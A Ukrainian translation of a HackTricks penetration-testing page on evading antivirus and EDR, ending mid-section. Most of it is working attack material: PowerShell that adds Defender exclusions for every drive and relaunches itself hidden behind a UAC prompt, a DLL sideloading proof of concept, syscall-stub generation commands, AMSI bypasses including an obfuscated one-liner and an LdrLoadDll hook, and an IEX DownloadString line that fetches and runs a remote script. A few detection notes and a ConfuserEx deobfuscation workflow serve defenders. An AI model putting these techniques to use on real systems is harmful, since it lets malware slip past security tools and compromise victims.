# Обхід антивірусу (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки Windows Defender, який видає себе за інший антивірус.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка з UAC у стилі інсталятора перед втручанням у Defender

Публічні loaders, що маскуються під чити для ігор, часто постачаються як непідписані інсталятори Node.js/Nexe, які спершу **запитують у користувача підвищення привілеїв**, а потім нейтралізують Defender. Схема проста:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда завершується успішно лише тоді, коли викликач має права адміністратора, тож помилка вказує на те, що loader працює від імені звичайного користувача.
2. Негайно перезапустити себе з дієсловом `RunAs`, щоб викликати очікуваний запит UAC на підтвердження, зберігши початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви вже вважають, що встановлюють «cracked»-програмне забезпечення, тож зазвичай погоджуються із запитом, надаючи malware потрібні права для зміни політики Defender.<sup>[[26]](#references)</sup>

### Виключення `MpPreference` для всіх літер дисків без винятку

Отримавши підвищені привілеї, ланцюжки на кшталт GachiLoader максимально використовують сліпі зони Defender, а не вимикають службу повністю. Спочатку loader завершує роботу GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, через які неможливо сканувати профілі всіх користувачів, системні каталоги та знімні диски:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ключові спостереження:

- Цикл проходить усі змонтовані файлові системи (D:\, E:\, USB-накопичувачі тощо), тож **будь-які майбутні payload, розміщені будь-де на диску, ігноруватимуться**.
- Виключення розширення `.sys` передбачене на майбутнє — зловмисники залишають собі можливість пізніше завантажувати непідписані драйвери, не взаємодіючи повторно з Defender.
- Усі зміни вносяться в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, тож наступні етапи можуть перевірити, чи збереглися виключення, або розширити їх без повторного виклику UAC.

Оскільки жодну службу Defender не зупинено, наївні перевірки стану й надалі показують «антивірус активний», хоча перевірка в реальному часі не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія AV Evasion**

Зараз AV використовують різні методи для перевірки файлів на шкідливість: статичне виявлення, динамічний аналіз, а в просунутіших EDR — поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення працює завдяки виявленню відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також вилученню інформації із самого файлу (наприклад, опису файлу, назви компанії, цифрових підписів, значка, контрольної суми тощо). Це означає, що використання відомих публічних інструментів може швидше призвести до виявлення, оскільки їх, імовірно, вже проаналізували й позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати бінарний файл, AV не зможе виявити вашу програму, але знадобиться певний loader, щоб розшифрувати її та запустити в пам’яті.

- **Обфускація**

Іноді достатньо змінити кілька рядків у бінарному файлі чи скрипті, щоб AV його не виявив, але залежно від того, що саме ви намагаєтеся обфускувати, це може забрати багато часу.

- **Власні інструменти**

Якщо розробити власні інструменти, для них не буде відомих шкідливих сигнатур, але це потребує багато часу й зусиль.

> [!TIP]
> Щоб перевірити файл на статичне виявлення Windows Defender, скористайтеся [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він розбиває файл на кілька сегментів, а потім просить Defender просканувати кожен окремо. Так можна точно визначити рядки або байти у вашому бінарному файлі, які позначаються як підозрілі.

Наполегливо рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичне застосування AV Evasion.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш бінарний файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі браузера, створити minidump LSASS тощо). З цим може бути трохи складніше працювати, але ось кілька способів обійти sandbox.

- **Затримка перед виконанням** Залежно від реалізації, це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому тривалі затримки можуть завадити аналізу бінарних файлів. Проблема в тому, що багато sandbox в AV можуть просто пропустити затримку — залежно від способу її реалізації.
- **Перевірка ресурсів комп’ютера** Зазвичай sandbox мають у розпорядженні дуже мало ресурсів (наприклад, < 2GB RAM), інакше вони могли б сповільнити комп’ютер користувача. Тут можна підійти до справи творчо, наприклад перевіряти температуру CPU або навіть швидкість обертання вентиляторів — у sandbox реалізовано не все.
- **Перевірки, специфічні для комп’ютера** Якщо ви хочете націлитися на користувача, робоча станція якого приєднана до домену "contoso.local", можна перевірити домен комп’ютера й порівняти його із заданим. Якщо він не збігається, програма може завершити роботу.

Виявляється, computername sandbox Microsoft Defender — HAL9TH. Тож перед detonation можна перевірити ім’я комп’ютера у своєму malware: якщо воно збігається з HAL9TH, це означає, що ви перебуваєте в sandbox Defender, і програма може завершити роботу.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька справді корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо обходу sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже казали в цій статті, **публічні інструменти** рано чи пізно **почнуть виявлятися**, тож варто запитати себе ось про що:

Наприклад, якщо вам потрібно зробити дамп LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися менш відомим проєктом, який теж створює дамп LSASS?

Імовірно, правильна відповідь — останній варіант. Якщо взяти mimikatz як приклад, це, мабуть, один із найбільш позначених AV та EDR зразків malware. Сам проєкт дуже крутий, але працювати з ним для обходу AV — справжній кошмар, тож просто шукайте альтернативи для виконання потрібного завдання.

> [!TIP]
> Змінюючи payload для обходу виявлення, не забудьте **вимкнути автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ЇХ НА VIRUSTOTAL**, якщо ваша мета — довгострокове уникнення виявлення. Якщо хочете перевірити, чи виявляє певний AV ваш payload, установіть його на VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **віддавайте перевагу DLL для обходу виявлення**. З мого досвіду, DLL-файли зазвичай **виявляють і аналізують значно рідше**, тож у деяких випадках це дуже простий спосіб уникнути виявлення (звісно, якщо ваш payload можна запустити як DLL).

Як видно на цьому зображенні, рівень виявлення DLL Payload від Havoc на antiscan.me становить 4/26, тоді як рівень виявлення EXE payload — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного EXE payload від Havoc зі звичайним DLL від Havoc</p></figcaption></figure>

Далі розглянемо кілька хитрощів, які допоможуть зробити DLL-файли значно непомітнішими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, застосовуваний loader, розміщуючи цільову програму та шкідливі payload поруч одне з одним.

Ви можете шукати програми, вразливі до DLL Sideloading, за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого powershell-скрипту:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у `"C:\Program Files\\"`, вразливих до DLL hijacking, і файли DLL, які вони намагаються завантажити.

Наполегливо рекомендую **самостійно дослідити програми, вразливі до DLL Hijacking/Sideloading**. За належного виконання ця техніка досить непомітна, але якщо використовувати загальновідомі програми, вразливі до DLL Sideloading, вас можуть легко викрити.

Якщо просто помістити шкідливу DLL з ім’ям, яке програма очікує завантажити, ваш payload не завантажиться: програма очікує наявності в цій DLL певних функцій. Щоб розв’язати цю проблему, ми скористаємося іншою технікою під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики програми з проксі-DLL (яка є шкідливою) до оригінальної DLL, зберігаючи таким чином функціональність програми та даючи змогу виконати ваш payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/).

Ось кроки, яких я дотримувався:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають Detection rate 0/26 на [antiscan.me](https://antiscan.me)! Це можна вважати успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Щиро рекомендую** подивитися [запис трансляції S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб детальніше дізнатися про те, що ми обговорили.

### Abusing Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «forwarders»: замість вказівника на код запис експорту містить рядок ASCII у форматі `TargetDll.TargetFunc`. Коли викликач шукає цей експорт, завантажувач Windows:

- Завантажує `TargetDll`, якщо він ще не завантажений
- Знаходить у ньому `TargetFunc`

Важливо розуміти такі особливості:
- Якщо `TargetDll` є KnownDLL, його буде надано із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає каталог модуля, що виконує перенаправлення.

Це дає змогу застосувати непрямий примітив sideloading: знайти підписану DLL, яка експортує функцію, перенаправлену до модуля з назвою, що не належить до KnownDLL, а потім розмістити цю підписану DLL поруч із DLL під контролем зловмисника, названою точно так само, як цільовий модуль перенаправлення. Коли буде викликано перенаправлений експорт, завантажувач обробить перенаправлення та завантажить вашу DLL із того самого каталогу, виконавши ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому його пошук відбувається у звичайному порядку.

PoC (копіювання-вставлення):
1) Скопіюйте підписану системну DLL до папки, доступної для запису.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Розмістіть шкідливу `NCRYPTPROV.dll` у тій самій папці. Для виконання коду достатньо мінімальної `DllMain`; реалізовувати переспрямовану функцію, щоб викликати `DllMain`, не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Активуйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час пошуку `KeyIsoSetAuditingInterface` завантажувач переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` із `C:\test` і виконує її `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" з’явиться лише після виконання `DllMain`

Поради з пошуку:
- Зосередьтеся на forwarded exports, де цільовий модуль не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Перерахувати forwarded exports можна за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте список форвардерів Windows 11, щоб знайти відповідні варіанти: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї щодо виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із несистемних шляхів, а потім завантажують із цього каталогу DLL, які не є KnownDLLs, але мають таку саму базову назву
- Сповіщайте про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → несистемний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в каталогах програм

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це набір інструментів для створення payload, призначений для обходу EDR за допомогою призупинених процесів, прямих системних викликів і альтернативних методів виконання`

За допомогою Freeze можна непомітно завантажувати й виконувати свій shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити. Тому ніколи не покладайтеся лише на один інструмент і, якщо можливо, поєднуйте кілька технік evasion.

## Прямі/непрямі Syscalls і визначення SSN (SysWhispers4)

EDR часто встановлюють **inline hooks у user-mode** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна згенерувати **прямі** або **непрямі** syscall stubs, які завантажують правильний **SSN** (System Service Number) і переходять у режим ядра, не виконуючи hooked export entrypoint.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Прямий (вбудований)**: додати до згенерованого stub інструкцію `syscall`/`sysenter`/`SVC #0` (без звернення до export у `ntdll`).
- **Непрямий**: перейти до наявного `syscall` gadget усередині `ntdll`, щоб перехід у режим ядра виглядав так, ніби він походить із `ntdll` (корисно для обходу евристик); **randomized indirect** вибирає gadget із набору для кожного виклику.
- **Пошук egg**: уникати вбудовування статичної послідовності opcode `0F 05` на диску; знаходити послідовність syscall під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (сортування VA)**: визначати SSN, сортуючи syscall stubs за віртуальними адресами замість читання байтів stub.
- **SyscallsFromDisk**: зіставити чистий `\KnownDlls\ntdll.dll`, зчитати SSN із його `.text`, а потім скасувати зіставлення (обхід усіх hooks у пам’яті).
- **RecycledGate**: поєднати визначення SSN за сортуванням VA з перевіркою opcode, якщо stub чистий; якщо він hooked — перейти до визначення за VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і використати VEH, щоб під час виконання отримати SSN з `EAX`, не аналізуючи hooked bytes.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI створили, щоб запобігти "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV могли сканувати лише **файли на диску**, тож якщо вдавалося виконати payloads **безпосередньо в пам’яті**, AV не могли цьому завадити, оскільки не мали достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- User Account Control, або UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне обчислення коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Ця функція дає змогу антивірусним рішенням перевіряти поведінку скриптів, надаючи їхній вміст у незашифрованому та необфускованому вигляді.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` викличе таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що на початку додається `amsi:`, а потім указується шлях до виконуваного файлу, з якого запустили скрипт, у цьому випадку — powershell.exe.

Ми не записували жодних файлів на диск, але все одно були виявлені в пам’яті завдяки AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також перевіряється через AMSI. Це впливає навіть на `Assembly.Load(byte[])`, який завантажує код для виконання в пам’яті. Тому для виконання в пам’яті, якщо потрібно обійти AMSI, рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або раніші).

Є кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI переважно використовує статичне виявлення, зміна скриптів, які ви намагаєтеся завантажити, може стати хорошим способом уникнути виявлення.

Однак AMSI може деобфускувати скрипти, навіть якщо вони мають кілька рівнів обфускації, тому залежно від способу обфускації цей варіант може бути невдалим. Через це обхід не такий простий. Водночас іноді достатньо змінити кілька назв змінних, тож усе залежить від того, наскільки щось позначено як підозріле.

- **AMSI Bypass**

Оскільки AMSI реалізовано через завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), її можна легко підмінити навіть від імені непривілейованого користувача. Через цей недолік реалізації AMSI дослідники знайшли кілька способів обходити сканування AMSI.

**Примусове виникнення помилки**

Якщо змусити ініціалізацію AMSI завершитися помилкою (amsiInitFailed), сканування для поточного процесу не буде запущено. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб запобігти широкому використанню цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Достатньо було одного рядка коду PowerShell, щоб зробити AMSI непридатним до використання в поточному процесі PowerShell. Звісно, цей рядок розпізнає сам AMSI, тож для використання цієї техніки потрібна певна модифікація.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Майте на увазі: цю публікацію, імовірно, позначать після її виходу, тож не публікуйте код, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в пошуку адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезаписі її інструкціями, що повертають код E_INVALIDARG. У результаті фактичне сканування повертає 0, що інтерпретується як чистий результат.

> [!TIP]
> Прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для докладнішого пояснення.

Існує також багато інших технік обходу AMSI за допомогою powershell. Щоб дізнатися про них більше, перегляньте [**цю сторінку**](basic-powershell-for-pentesters/index.html#amsi-bypass) і [**цей репозиторій**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Блокування AMSI через запобігання завантаженню amsi.dll (хук LdrLoadDll)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний, незалежний від мови обхід — встановити хук у режимі користувача на `ntdll!LdrLoadDll`, який повертає помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і в цьому процесі не виконується сканування.<sup>[[23]](#references)</sup>

Загальний опис реалізації (псевдокод x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Нотатки
- Працює з PowerShell, WScript/CScript і власними loaders (з усім, що інакше завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів у командному рядку.
- Відомі випадки використання loaders, запущених через LOLBins (наприклад, `regsvr32`, який викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для bypass AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для bypass AMSI, який уникає виявлення за сигнатурою за допомогою рандомізованих визначених користувачем функцій, змінних і виразів із символами, а також випадкового регістру символів у ключових словах PowerShell.

**Видалення виявленої сигнатури**

Ви можете використовувати такі інструменти, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам'яті поточного процесу. Цей інструмент сканує пам'ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам'яті.

**Продукти AV/EDR, що використовують AMSI**

Список продуктів AV/EDR, що використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використання Powershell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не завантажиться, тож ви зможете запускати скрипти без перевірки AMSI. Це можна зробити так:

```bash
powershell.exe -version 2
```

## Журналювання PS

Журналювання PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту й усунення несправностей, але також може стати **проблемою для зловмисників, які хочуть уникнути виявлення**.

Щоб обійти журналювання PowerShell, можна скористатися такими методами:

- **Вимкнути транскрибування PowerShell і журналювання модулів**: для цього можна скористатися інструментом [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використовувати PowerShell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож скрипти можна запускати без перевірки AMSI. Для цього виконайте: `powershell.exe -version 2`
- **Використовувати некерований сеанс PowerShell**: скористайтеся [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб запустити PowerShell без запуску `powershell.exe` (цей підхід використовує `powerpick` від Cobalt Strike). Це дає змогу обійти засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging чи інші засоби захисту PowerShell; рівень захисту залежить від середовища виконання та реалізації хоста.


## Обфускація

> [!TIP]
> Деякі методи обфускації передбачають шифрування даних, що збільшує ентропію бінарного файла й полегшує його виявлення засобами AV та EDR. Будьте обережні: можливо, варто шифрувати лише окремі частини коду, які є чутливими або які потрібно приховати.

### Деобфускація бінарних файлів .NET, захищених ConfuserEx

Під час аналізу шкідливого програмного забезпечення, яке використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, що блокують декомпілятори й пісочниці. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення захисту від підміни — ConfuserEx шифрує кожне *тіло методу* й розшифровує його в статичному конструкторі *модуля* (`<Module>.cctor`). Також він змінює контрольну суму PE, тож будь-яка модифікація спричинить аварійне завершення бінарного файла. Скористайтеся **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити ключі XOR і переписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / потоку керування — передайте *clean* файл у **de4dot-cex** (форк de4dot з підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Прапорці:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує control-flow flattening, відновить початкові простори імен, класи та назви змінних і розшифрує рядки-константи.

3.  Proxy-call stripping – ConfuserEx замінює прямі виклики методів легковаговими обгортками (так званими *proxy calls*), щоб ще більше ускладнити декомпіляцію.  Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні .NET API, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Очищення вручну — запустіть отриманий бінарний файл у dnSpy та пошукайте великі блоки Base64 або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжній* payload. Часто malware зберігає його як масив байтів у форматі TLV, ініціалізований усередині `<Module>.byte_0`.

Наведений вище ланцюжок відновлює потік виконання **без** запуску шкідливого зразка — це корисно під час роботи на ізольованій робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного сортування зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# обфускатор**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — створити open-source fork набору компіляторів [LLVM](http://www.llvm.org/), здатний підвищити безпеку програмного забезпечення за допомогою [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захисту від втручання.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації обфускованого коду під час компіляції без зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих фреймворком метапрограмування шаблонів C++, що трохи ускладнює життя тому, хто хоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор x64-бінарних файлів, який може обфускувати різні PE-файли, зокрема: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк для дрібнозернистої обфускації коду мов, що підтримуються LLVM, із використанням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки й руйнуючи наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування кожної функції за допомогою компілятора LLVM

